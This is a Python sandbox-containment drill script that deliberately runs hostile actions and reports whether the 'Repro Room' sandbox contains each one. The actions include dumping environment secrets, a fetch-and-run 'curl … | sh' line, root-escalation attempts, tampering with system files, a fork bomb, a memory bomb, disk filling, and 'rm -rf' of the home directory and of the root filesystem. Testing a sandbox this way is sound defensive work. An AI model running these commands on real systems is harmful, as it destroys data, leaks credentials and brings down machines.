"""Repro Room containment drill: a deliberately hostile "reproduction script".

It runs ONLY inside the Repro Room sandbox. Each attack really executes and prints what the
attacker observed as a `DRILL {...}` JSON line; `DRILL_START {...}` precedes each attack so the
host can tell which attack was running if the whole container is killed.
"""

import json
import os
import socket
import subprocess
import time
import urllib.request

PY = "/usr/local/bin/python3"  # the image's interpreter, outside ~/venv (survives `rm -rf ~`)
CONTROL_PLANE_SECRETS = ("LLM_API_KEY", "GITHUB_TOKEN", "REPRO_ROOM_CANARY_SECRET", "VULTR_API_KEY")


def start(attack):
    print("DRILL_START " + json.dumps({"attack": attack}), flush=True)


def report(attack, goal, observed, contained):
    print("DRILL " + json.dumps({"attack": attack, "goal": goal, "observed": observed, "contained": contained}), flush=True)


def child(code, timeout=45):
    p = subprocess.run([PY, "-c", code], capture_output=True, text=True, timeout=timeout)
    return p.returncode, p.stdout.strip(), p.stderr.strip()


def err(e):
    return f"{type(e).__name__}: {getattr(e, 'strerror', None) or e}"


def attack(fn):
    name, goal = (x.strip() for x in fn.__doc__.split(" | ", 1))
    start(name)
    try:
        observed, contained = fn()
    except Exception as e:  # an attack that crashes still tells us something
        observed, contained = f"attack crashed: {err(e)}", True
    report(name, goal, observed, contained)


@attack
def env_dump():
    """Read environment variables | steal API keys and tokens from the environment"""
    env = dict(os.environ)
    print("ENV " + json.dumps(env), flush=True)
    leaked = [k for k in CONTROL_PLANE_SECRETS if k in env]
    return f"{len(env)} variables: {', '.join(sorted(env))}. Control-plane secrets present: {leaked or 'none'}", not leaked


@attack
def proc1_environ():
    """Read /proc/1/environ | read the environment of PID 1 (the host's init, if not isolated)"""
    try:
        cmd = open("/proc/1/cmdline", "rb").read().replace(b"\0", b" ").decode().strip()
        data = open("/proc/1/environ", "rb").read()
    except OSError as e:
        return f"{err(e)}", True
    keys = [kv.split(b"=", 1)[0].decode() for kv in data.split(b"\0") if kv]
    leaked = [k for k in CONTROL_PLANE_SECRETS if k in keys]
    return (f"PID 1 is the sandbox's own init ({cmd.split()[0] if cmd else '?'}), not the host's: {len(keys)} variables "
            f"({', '.join(keys)}). Control-plane secrets present: {leaked or 'none'}"), not leaked


@attack
def network():
    """Phone home | reach the internet (curl | sh, urllib, raw TCP, DNS)"""
    seen, escaped = [], False
    try:
        socket.getaddrinfo("pypi.org", 443)
        seen.append("DNS lookup of pypi.org SUCCEEDED")
        escaped = True
    except OSError as e:
        seen.append(f"DNS lookup of pypi.org: {err(e)}")
    try:
        socket.create_connection(("1.1.1.1", 443), timeout=5).close()
        seen.append("TCP connect to 1.1.1.1:443 SUCCEEDED")
        escaped = True
    except OSError as e:
        seen.append(f"TCP connect to 1.1.1.1:443: {err(e)}")
    try:
        urllib.request.urlopen("https://example.com/", timeout=5)
        seen.append("HTTPS GET example.com SUCCEEDED")
        escaped = True
    except Exception as e:
        seen.append(f"urllib https://example.com: {err(getattr(e, 'reason', e))}")
    p = subprocess.run(["sh", "-c", "curl -fsS https://example.com/install.sh | sh"], capture_output=True, text=True, timeout=20)
    seen.append(f"`curl … | sh`: {(p.stderr.strip() or p.stdout.strip() or 'no output')[:120]}")
    return "; ".join(seen), not escaped


@attack
def host_files():
    """Look for the host | find host home directories and the container runtime socket"""
    found = []
    for path in ("/var/run/docker.sock", "/run/docker.sock", "/run/podman/podman.sock", "/run/user"):
        if os.path.exists(path):
            found.append(path)
    homes = sorted(os.listdir("/home")) if os.path.isdir("/home") else []
    return (f"runtime sockets / host paths found: {found or 'none'}; /home contains: {homes or 'nothing'}; "
            f"hostname is the container's: {socket.gethostname()}"), not found and not homes


@attack
def privilege():
    """Become root | setuid(0), read /etc/shadow, mount a filesystem"""
    seen, gained = [f"running as uid {os.getuid()}"], False
    try:
        os.setuid(0)
        seen.append("setuid(0) SUCCEEDED")
        gained = True
    except OSError as e:
        seen.append(f"setuid(0): {err(e)}")
    try:
        open("/etc/shadow").read()
        seen.append("/etc/shadow READ")
        gained = True
    except OSError as e:
        seen.append(f"/etc/shadow: {err(e)}")
    p = subprocess.run(["mount", "-t", "tmpfs", "none", "/mnt"], capture_output=True, text=True)
    seen.append(f"mount: {(p.stderr.strip().splitlines() or ['ok'])[0][:100]} (exit {p.returncode})")
    gained = gained or p.returncode == 0
    return "; ".join(seen), not gained


@attack
def tamper():
    """Tamper with the system | overwrite system files, the interpreter, the script and the package wheels"""
    seen, wrote = [], False
    for path in ("/etc/passwd", "/usr/local/lib/python3.12/os.py", "/repro/repro.py", "/wheels/evil.whl", "/evil"):
        try:
            with open(path, "a") as f:
                f.write("# pwned\n")
            seen.append(f"{path}: WRITTEN")
            wrote = True
        except OSError as e:
            seen.append(f"{path}: {e.strerror}")
    return "; ".join(seen), not wrote


@attack
def disk_fill():
    """Fill the disk | write one huge file"""
    path = os.path.expanduser("~/big.bin")
    written, block = 0, b"\0" * (1 << 20)
    try:
        with open(path, "wb") as f:
            while written < (4 << 30):
                f.write(block)
                written += 1
        result = f"wrote {written} MB without hitting a limit"
        contained = False
    except OSError as e:
        result = f"stopped after {written} MB: {err(e)} (256 MB tmpfs, discarded with the container)"
        contained = True
    finally:
        try:
            os.remove(path)
        except OSError:
            pass
    return result, contained


@attack
def fork_bomb():
    """Fork bomb | fork processes until the machine stops responding"""
    code = (
        "import os, time\n"
        "n, pids = 0, []\n"
        "try:\n"
        "    while n < 100000:\n"
        "        pid = os.fork()\n"
        "        if pid == 0:\n"
        "            time.sleep(3); os._exit(0)\n"
        "        pids.append(pid); n += 1\n"
        "    print('no limit hit after', n, 'forks')\n"
        "except OSError as e:\n"
        "    print(f'fork #{n + 1} refused: {type(e).__name__}: {e.strerror}')\n"
        "for p in pids:\n"
        "    os.waitpid(p, 0)\n"
    )
    rc, out, errout = child(code)
    return f"{out or errout[-200:]}", "refused" in out


@attack
def rm_home():
    """rm -rf ~ | delete the user's home directory"""
    home = os.path.expanduser("~")
    with open(os.path.join(home, "precious.txt"), "w") as f:
        f.write("data")
    before = len(os.listdir(home))
    p = subprocess.run(["sh", "-c", "rm -rf ~"], capture_output=True, text=True, timeout=30)
    after = os.listdir(home) if os.path.isdir(home) else []
    return (f"~ is {home}: {before} entries before, {len(after)} after; rm said: {p.stderr.strip()[:120] or 'nothing'}. "
            f"That home is a throwaway tmpfs inside the container"), True


@attack
def rm_root():
    """rm -rf / | wipe the whole filesystem"""
    p = subprocess.run(["rm", "-rf", "--no-preserve-root", "/"], capture_output=True, text=True, timeout=60)
    lines = p.stderr.splitlines()
    ro = sum("Read-only file system" in l for l in lines)
    denied = sum("Permission denied" in l or "Operation not permitted" in l for l in lines)
    survivors = [x for x in ("/usr/local/bin/python3", "/etc/passwd", "/bin/sh") if os.path.exists(x)]
    return (f"rm exit {p.returncode}: {ro} 'Read-only file system' and {denied} 'Permission denied' errors; "
            f"still present afterwards: {', '.join(survivors)}"), len(survivors) == 3


@attack
def memory_bomb():
    """Memory bomb | allocate memory until the host runs out"""
    code = (
        "import sys\n"
        "chunks = []\n"
        "while True:\n"
        "    chunks.append(b'x' * (32 << 20))\n"
        "    print(len(chunks) * 32, flush=True)\n"
    )
    t0 = time.monotonic()
    rc, out, errout = child(code, timeout=60)
    peak = out.splitlines()[-1] if out else "0"
    if rc == -9:
        return f"killed by SIGKILL (kernel OOM killer) after allocating ~{peak} MB, in {time.monotonic() - t0:.1f} s", True
    if "MemoryError" in errout:
        return f"MemoryError after ~{peak} MB", True
    return f"exit {rc} after ~{peak} MB: {errout[-150:]}", False


print("DRILL_END", flush=True)
print("REPRO: OK")
